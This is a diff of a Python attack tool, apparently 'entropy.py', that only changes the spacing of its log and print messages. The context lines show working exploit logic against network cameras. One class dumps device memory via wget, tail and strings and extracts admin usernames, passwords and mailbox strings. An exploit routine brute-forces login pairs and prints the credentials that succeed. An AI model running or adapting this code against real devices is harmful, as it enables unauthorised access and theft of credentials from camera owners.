@@ -120,9 +120,9 @@ class NWThread(threading.Thread):
                     tmp=i.split('\'')
                     macaddr=tmp[1]
                     if args.outputfile:
-                        logger.info(color.A+"[*]"+color.E+" %s:%s, MAC:%s"%(self.ip,self.port,macaddr))
+                        logger.info(color.A+"[*]"+color.E+" %s:%s, MAC: %s"%(self.ip,self.port,macaddr))
                     if args.verbose:
-                        print(color.A+"[*]"+color.E+" %s:%s, MAC:%s"%(self.ip,self.port,macaddr))
+                        print(color.A+"[*]"+color.E+" %s:%s, MAC: %s"%(self.ip,self.port,macaddr))
                     return macaddr
         except Exception:
             return None
@@ -133,18 +133,18 @@ class NWThread(threading.Thread):
                 pw = subprocess.Popen(pw_args,stdout=open(self.tmpstream,'w'))
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured:%s"%(self.ip,self.port,e))
+                    logger.error(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured: %s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured:%s"%(self.ip,self.port,e))
+                    print(color.B+"[-]"+color.E+" The %s:%s, wget part has error occured: %s"%(self.ip,self.port,e))
             subprocess.Popen("echo '' > %s" % self.tmpout,shell=True)
             time.sleep(1)
             try:
                 pt = subprocess.Popen("tail --pid=%d -f %s | strings >> %s" % (pw.pid,self.tmpstream, self.tmpout), shell=True)
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured:%s"%(self.ip,self.port,e))
+                    logger.error(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured: %s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured:%s"%(self.ip,self.port,e))
+                    print(color.B+"[-]"+color.E+" The %s:%s, tail -f part has error occured: %s"%(self.ip,self.port,e))
             subprocess.Popen("sed -e 's/replace/%s/g' -e 's/300/%d/g' %s > %s" % (self.forreplace,args.timeout+100,self.base, self.usefile), shell=True)
             time.sleep(0.5)
             subprocess.Popen("chmod a+x %s" % self.usefile, shell=True)
@@ -153,9 +153,9 @@ class NWThread(threading.Thread):
                 padd = subprocess.Popen([self.usefile])
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured:%s"%(self.ip,self.port,e))
+                    logger.error(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured: %s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured:%s"%(self.ip,self.port,e))
+                    print(color.B+"[-]"+color.E+" The %s:%s, addpy part has error occured: %s"%(self.ip,self.port,e))
             while True:
                 if os.stat(self.tmpout).st_size < 1024:
                     self.init_end_time = time.time()
@@ -194,58 +194,58 @@ class NWThread(threading.Thread):
                     break
         except Exception as e:
             if args.outputfile:
-                logger.error(color.B+"[-]"+color.E+" The error occured in memorydump at ip %s:%s" % (self.ip, e))
+                logger.error(color.B+"[-]"+color.E+" The error occured in memorydump at %s:%s" % (self.ip, e))
             if args.verbose:
-                print(color.B+"[-]"+color.E+" The error occured in memorydump at ip %s:%s" % (self.ip, e))
+                print(color.B+"[-]"+color.E+" The error occured in memorydump at %s:%s" % (self.ip, e))
         finally:
             try:
                 padd.kill()
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
+                    logger.error(color.B+"[-]"+color.E+" (%s) The error occured in killing addpy part: %s" % (self.ip, e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
+                    print(color.B+"[-]"+color.E+" (%s) The error occured in killing addpy part: %s" % (self.ip, e))
             try:
                 subprocess.Popen("rm %s 2> /dev/null" % self.usefile,shell=True)
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" IP:%s,the error occured in removing addpy part:%s"%(self.ip,e))
+                    logger.error(color.B+"[-]"+color.E+" (%s) the error occured in removing addpy part: %s"%(self.ip,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
+                    print(color.B+"[-]"+color.E+" (%s) The error occured in killing addpy part: %s" % (self.ip, e))
             try:
                 pw.kill()
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" IP:%s,The error occured in killing wget part:%s" % (self.ip, e))
+                    logger.error(color.B+"[-]"+color.E+" (%s) The error occured in killing wget part: %s" % (self.ip, e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
+                    print(color.B+"[-]"+color.E+" (%s) The error occured in killing addpy part: %s" % (self.ip, e))
             try:
                 subprocess.Popen("rm %s 2> /dev/null" % self.tmpstream,shell=True)
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" IP:%s,The error occured in removing tmpstream part:%s" % (self.ip, e))
+                    logger.error(color.B+"[-]"+color.E+" (%s) The error occured in removing tmpstream part: %s" % (self.ip, e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
+                    print(color.B+"[-]"+color.E+" (%s) The error occured in killing addpy part: %s" % (self.ip, e))
             try:
                 pt.kill()
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" IP:%s,The error occured in killing tail part:%s" % (self.ip, e))
+                    logger.error(color.B+"[-]"+color.E+" (%s) The error occured in killing tail part: %s" % (self.ip, e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" IP:%s,The error occured in killing tail part:%s" % (self.ip, e))
+                    print(color.B+"[-]"+color.E+" (%s) The error occured in killing tail part: %s" % (self.ip, e))
             try:
                 subprocess.Popen("rm %s 2> /dev/null" % self.tmpout,shell=True)
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.B+"[-]"+color.E+" IP:%s,The error occured in removing tmpout part:%s"%(self.ip,e))
+                    logger.error(color.B+"[-]"+color.E+" (%s) The error occured in removing tmpout part: %s"%(self.ip,e))
                 if args.verbose:
-                    print(color.B+"[-]"+color.E+" IP:%s,The error occured in removing tmpout part:%s"%(self.ip,e))
+                    print(color.B+"[-]"+color.E+" (%s) The error occured in removing tmpout part: %s"%(self.ip,e))
     def exploit(self):
         for i in self.loginlist:
             for j in self.loginlist:
@@ -262,8 +262,8 @@ class NWThread(threading.Thread):
                         time.sleep(tmp_sleep)
                         if tmp_r.status_code == 200:
                             if args.outputfile:
-                                logger.info(color.G+"[+]"+color.E+" The %s:%s, username:%s,password:%s"%(self.ip,self.port,i,j))
-                            print(color.G+"[+]"+color.E+" The %s:%s, username:%s,password:%s"%(self.ip,self.port,i,j))
+                                logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s"%(self.ip,self.port,i,j))
+                            print(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s"%(self.ip,self.port,i,j))
                             return
                         else:
                             continue
@@ -280,8 +280,8 @@ class NWThread(threading.Thread):
                             time.sleep(tmp_sleep)
                             if tmp_r.status_code == 200:
                                 if args.outputfile:
-                                    logger.info(color.Sucgreen+"The %s:%s, username:%s,password:%s" % (self.ip, self.port, i, j))
-                                print(color.G+"[+]"+color.E+" The %s:%s, username:%s,password:%s" % (self.ip, self.port, i, j))
+                                    logger.info(color.Sucgreen+"The %s:%s, username: %s,password: %s" % (self.ip, self.port, i, j))
+                                print(color.G+"[+]"+color.E+" The %s:%s, username: %s,password: %s" % (self.ip, self.port, i, j))
                                 return
                             else:
                                 continue
@@ -357,9 +357,9 @@ class GoAThread(threading.Thread):
                                 if not self.mailbox_flag:
                                     tmp_mailbox = i.strip('\n').strip(' ').strip()
                                     if args.outputfile:
-                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, mailbox:%s" % (self.ip, self.port, tmp_mailbox))
+                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, mailbox: %s" % (self.ip, self.port, tmp_mailbox))
                                         logger.info(color.G+"[+]"+color.E+" You may check mailbox password manually in directory RECHECK!The file is recheck_%s"%self.ip)
-                                    print(color.G+"[+]"+color.E+" The %s:%s, mailbox:%s" % (self.ip, self.port, tmp_mailbox))
+                                    print(color.G+"[+]"+color.E+" The %s:%s, mailbox: %s" % (self.ip, self.port, tmp_mailbox))
                                     print(color.G+"[+]"+color.E+" You may check mailbox password manually in directory RECHECK! The file is recheck_%s"%self.ip)
                                     self.mailbox_flag = True
                                     self.keep_strings_file = True
@@ -367,15 +367,15 @@ class GoAThread(threading.Thread):
                                 if 'admin' in i:
                                     tmp_username = i.strip('\n').strip(' ').strip()
                                     if args.outputfile:
-                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, username:%s" % (self.ip, self.port, tmp_username))
-                                    print(color.G+"[+]"+color.E+" The %s:%s, username:%s" % (self.ip, self.port, tmp_username))
+                                        logger.info(color.G+"[+]"+color.E+" The %s:%s, username: %s" % (self.ip, self.port, tmp_username))
+                                    print(color.G+"[+]"+color.E+" The %s:%s, username: %s" % (self.ip, self.port, tmp_username))
                                     count = 1
                                     continue
                             elif count == 1:
                                 tmp_password = i.strip('\n').strip(' ').strip()
                                 if args.outputfile:
-                                    logger.info(color.G+"[+]"+color.E+" The %s:%s, password:%s" % (self.ip, self.port, tmp_password))
-                                print(color.G+"[+]"+color.E+" The %s:%s, password:%s" % (self.ip, self.port, tmp_password))
+                                    logger.info(color.G+"[+]"+color.E+" The %s:%s, password: %s" % (self.ip, self.port, tmp_password))
+                                print(color.G+"[+]"+color.E+" The %s:%s, password: %s" % (self.ip, self.port, tmp_password))
                                 break
                             else:
                                 continue
@@ -386,9 +386,9 @@ class GoAThread(threading.Thread):
                             print(color.G+"[+]"+color.E+" The default username is not admin, you need to check manually in directory RECHECK! The file is recheck_%s"%self.ip)
                 except Exception as e:
                     if args.outputfile:
-                        logger.error(color.B+"[-]"+color.E+" The error occured in getting info part:%s" % e)
+                        logger.error(color.B+"[-]"+color.E+" The error occured in getting info part: %s" % e)
                     if args.verbose:
-                        print(color.B+"[-]"+color.E+" The error occured in getting info part:%s" % e)
+                        print(color.B+"[-]"+color.E+" The error occured in getting info part: %s" % e)
                     pass
                 finally:
                     try:
@@ -526,7 +526,7 @@ def main():
                     tmp_ip_list.append(i.strip())
             crack(tmp_ip_list)
         except Exception as e:
-            print("The error occured:%s"%e)
+            print("The error occured: %s"%e)
             print("Please use python3 entropy.py -h or entropy -h for more help.")
     elif args.ip:
         bundle()
@@ -540,7 +540,7 @@ def main():
             inst.start()
             inst.join()
         except Exception as e:
-            print("The error occured:%s"%e)
+            print("The error occured: %s"%e)
             print("Please use python3 entropy.py -h or entropy -h for more help.")
     else:
         os.system("cat banner/banner.txt")
